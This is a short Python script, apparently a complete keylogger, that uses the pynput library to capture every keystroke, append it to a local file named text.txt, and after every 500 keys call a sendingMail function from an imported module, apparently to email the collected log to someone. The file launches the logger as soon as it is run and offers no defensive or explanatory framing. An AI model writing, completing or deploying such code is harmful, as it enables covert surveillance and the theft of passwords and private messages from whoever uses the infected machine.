import pynput as pt
import time
import sendingmail
counter =0
tmp=0
def press(key):
    global counter,tmp
    print("{0}".format(key))
    writing(key)
    counter+=1
    if counter>50:
        writing("\n")
        counter=0
    tmp += 1
    if tmp > 500:
        sendingmail.sendingMail()
        tmp = 0

def release(key):
    if key==pt.keyboard.Key.esc:
        return False

def writing(key):
    with open("text.txt", "a") as toFile:
        key2=str(key).replace("'","")
        if key2.find("space") >0:
            toFile.write(" ")
        elif key2.find("enter") >0:
            toFile.write("\n")
        elif key2.find("Key")==-1:
            toFile.write(key2)
def Keylog():
    with pt.keyboard.Listener(on_press=press,on_release=release) as listener:
        listener.join()





Keylog()
